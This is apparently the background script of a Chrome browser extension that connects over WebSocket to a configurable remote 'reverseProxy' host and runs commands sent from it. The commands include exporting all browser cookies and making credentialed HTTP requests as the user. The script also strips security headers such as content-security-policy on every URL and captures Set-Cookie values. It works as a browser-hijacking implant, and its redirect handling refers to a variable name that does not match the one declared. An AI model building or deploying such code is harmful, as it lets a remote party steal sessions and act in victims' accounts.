import {v4 as uuidv4} from 'https://jspm.dev/uuid'

import {getUnixTime} from "./utils.js";

const arrayBufferToBase64 = (buffer) => {
    let binary = '';

    const bytes = new Uint8Array(buffer);
    const len = bytes.byteLength;

    for (let i = 0; i < len; i++) {
        binary += String.fromCharCode(bytes[i]);
    }

    return btoa(binary);
}

const getSecureRandomToken = (bytes_length) => {
    const validChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let array = new Uint8Array(bytes_length);
    crypto.getRandomValues(array);
    array = array.map(x => validChars.charCodeAt(x % validChars.length));

    return String.fromCharCode.apply(null, array);
}

let lastConnectionTime = getUnixTime(), secretToken = getSecureRandomToken(64), redirectTable = {}, connection = null

export const setIsEnabled = (enabled) => {
    if (enabled) {
        startProxy()
    } else {
        stopProxy()
    }
}

const startProxy = async () => {
    return new Promise(async (res) => {
        try {
            if (connection) {
                await stopProxy()
            }

            chrome.storage.local.get(['settings'], async (result) => {
                const settings = result.settings

                if (!settings.reverseProxy) {
                    return res(true)
                }

                connection = new WebSocket(`ws://${settings.reverseProxy}:4343`);

                connection.onopen = function (e) {
                };

                connection.onmessage = async (event) => {
                    lastConnectionTime = getUnixTime()

                    let pData = null

                    try {
                        pData = JSON.parse(
                            event.data
                        );
                    } catch (e) {
                        return res(true)
                    }

                    if (pData.action in RPC_CALL_TABLE) {
                        try {
                            const result = await RPC_CALL_TABLE[pData.action](pData.data);

                            connection.send(
                                JSON.stringify({
                                    'id': pData.id,
                                    'origin_action': pData.action,
                                    'result': result,
                                })
                            )

                            return res(true)
                        } catch (e) {
                            return res(true)
                        }
                    }
                }
            })
        } catch (e) {

        }
    })
}

const stopProxy = () => {
    return new Promise(async (res) => {
        try {
            connection.close()
            connection = null

            return res(true)
        } catch (e) {
            return res(true)
        }
    })
}

export const checkConnection = async () => {
    try {
        chrome.storage.local.get(['proxyEnabled'], async (result) => {
            const proxyEnabled = result.proxyEnabled

            if (!connection) {
                if (proxyEnabled) {
                    await startProxy()
                } else {
                    return
                }
            }

            const PENDING_STATES = [0, 2];

            if (PENDING_STATES.includes(connection.readyState)) {
                return
            }

            const currentTime = getUnixTime()
            const diffTime = currentTime - lastConnectionTime

            if (diffTime > 29 || connection.readyState === 3) {
                await startProxy()

                return
            }

            try {
                connection.send(
                    JSON.stringify({
                        'id': uuidv4(),
                        'version': '1.0.0',
                        'action': 'PING',
                        'data': {}
                    })
                );
            } catch (e) {
                console.error(e)
            }
        })
    } catch (e) {

    }
}

const performHttpRequest = async (params) => {
    return new Promise(async (res) => {
        const credentials_mode = params.authenticated ? 'include' : 'omit';
        params.headers['X-PLACEHOLDER-SECRET'] = secretToken;

        const headers_to_replace = [];
        const header_keys = Object.keys(params.headers);

        header_keys.map(header_key => {
            if (HEADERS_TO_REPLACE.includes(header_key.toLowerCase())) {
                headers_to_replace.push(
                    header_key
                );
            }
        });

        headers_to_replace.map(header_key => {
            const new_header_key = `X-PLACEHOLDER-${header_key}`
            params.headers[new_header_key] = params.headers[header_key];
            delete params.headers[header_key];
        });

        const request_options = {
            method: params.method,
            mode: 'cors',
            cache: 'no-cache',
            credentials: credentials_mode,
            headers: params.headers,
            redirect: 'follow'
        }

        if (params.body) {
            const fetchURL = `data:application/octet-stream;base64,${params.body}`;
            const fetchResp = await fetch(fetchURL);
            request_options.body = await fetchResp.blob();
        }

        try {
            var ressall = await fetch(
                params.url,
                request_options
            );
        } catch (e) {
            return;
        }

        const request_headers = {};

        for (const pair of ressall.headers.entries()) {
            if (pair[0] === 'x-set-cookie') {
                request_headers['Set-Cookie'] = JSON.parse(pair[1]);
            } else {
                request_headers[pair[0]] = pair[1];
            }
        }

        const redirect_hewk_url_prefix = `${location.origin.toString()}/redirect-hack.html?id=`;

        if (ressall.url.startsWith(redirect_hewk_url_prefix)) {
            let request_metadata_string = decodeURIComponent(ressall.url);
            request_metadata_string = request_metadata_string.replace(
                redirect_hewk_url_prefix,
                ''
            );

            const redhid = request_metadata_string;
            const request_metadata = redirect_table[redhid];

            delete redirect_table[redhid];

            const redirect_hack_headers = {};

            request_metadata.headers.map(header_data => {
                if (header_data.name.toLowerCase() !== 'set-cookie') {
                    if (header_data.name === 'X-Set-Cookie') {
                        redirect_hack_headers['Set-Cookie'] = JSON.parse(header_data.value);
                    } else {
                        redirect_hack_headers[header_data.name] = header_data.value;
                    }
                }
            });

            return res({
                'url': ressall.url,
                'status': request_metadata.status_code,
                'status_text': 'Redirect',
                'headers': redirect_hack_headers,
                'body': '',
            });
        }

        return res({
            'url': ressall.url,
            'status': ressall.status,
            'status_text': ressall.statusText,
            'headers': request_headers,
            'body': arrayBufferToBase64(
                await ressall.arrayBuffer()
            )
        })
    })
}

const authenticate = (params) => {
    return new Promise((res) => {
        chrome.storage.local.get(['uuid'], function (cacheUuid) {
            const time = getUnixTime()
            const uuid = cacheUuid.uuid

            return res({
                'browser_id': uuid,
                'user_agent': uuid,
                'timestamp': time
            })
        })
    })
}

const getCookies = (params) => {
    return new Promise(async (res) => {
        if (!chrome.cookies) {
            return [];
        }

        return res(
            await getAllCookies({})
        );
    })
}

const getAllCookies = (details) => {
    return new Promise(function (resolve, reject) {
        try {
            chrome.cookies.getAll(details, function (cookies_array) {
                resolve(cookies_array);
            });
        } catch (e) {
            reject(e);
        }
    });
}

const RPC_CALL_TABLE = {
    'HTTP_REQUEST': performHttpRequest,
    'PONG': () => {
    },
    'AUTH': authenticate,
    'GET_COOKIES': getCookies,
};

const HEADERS_TO_REPLACE = [
    'origin',
    'referer',
    'access-control-ressall-headers',
    'access-control-ressall-method',
    'access-control-allow-origin',
    'date',
    'dnt',
    'trailer',
    'upgrade',
    'content-security-policy'
];

const REQUEST_HEADER_BLACKLIST = [
    'cookie'
];

chrome.webRequest.onBeforeSendHeaders.addListener(
    function (details) {
        if (!connection || details.initiator !== location.origin.toString()) {
            return
        }

        let has_header_secret = false;

        const header_keys_to_delete = [];
        const headers_to_append = [];

        details.requestHeaders.map(requestHeader => {
            if (requestHeader.name === 'X-PLACEHOLDER-SECRET' && requestHeader.value === secretToken) {
                has_header_secret = true;
                header_keys_to_delete.push('X-PLACEHOLDER-SECRET');
            }
        });

        if (!has_header_secret) {
            return {
                cancel: false
            };
        }

        details.requestHeaders.map(requestHeader => {
            if (!requestHeader.name.startsWith('X-PLACEHOLDER-SECRET') && requestHeader.name.startsWith('X-PLACEHOLDER-')) {
                header_keys_to_delete.push(requestHeader.name);
                if (REQUEST_HEADER_BLACKLIST.includes(requestHeader.name.replace('X-PLACEHOLDER-', '').toLowerCase())) {
                    return
                }
                headers_to_append.push({
                    'name': requestHeader.name.replace('X-PLACEHOLDER-', ''),
                    'value': requestHeader.value
                })
            }
        });

        details.requestHeaders = details.requestHeaders.filter(requestHeader => {
            return !header_keys_to_delete.includes(requestHeader.name);
        });

        details.requestHeaders = details.requestHeaders.concat(
            headers_to_append
        );

        return {
            requestHeaders: details.requestHeaders
        };
    }, {
        urls: ["<all_urls>"]
    }, ["requestHeaders", "extraHeaders"]
);


const REDIRECT_STATUS_CODES = [
    301,
    302,
    307
];

chrome.webRequest.onHeadersReceived.addListener(function (details) {
    if (!connection || details.initiator !== location.origin.toString()) {
        return
    }

    let cookies = []

    details.responseHeaders.map(responseHeader => {
        if (responseHeader.name.toLowerCase() === 'set-cookie') {
            cookies.push(responseHeader.value);
        }
    });

    if (cookies.length !== 0) {
        details.responseHeaders.push({
            'name': 'X-Set-Cookie',
            'value': JSON.stringify(cookies)
        });
    }

    if (!REDIRECT_STATUS_CODES.includes(details.statusCode)) {
        return {
            responseHeaders: details.responseHeaders
        }
    }

    const id = uuidv4();

    redirectTable[id] = JSON.parse(JSON.stringify({
        'url': details.url,
        'status_code': details.statusCode,
        'headers': details.responseHeaders
    }));

    return {
        redirectUrl: `${location.origin.toString()}/redirect-hack.html?id=` + id
    };
}, {
    urls: ["<all_urls>"]
}, ["responseHeaders", "extraHeaders"]);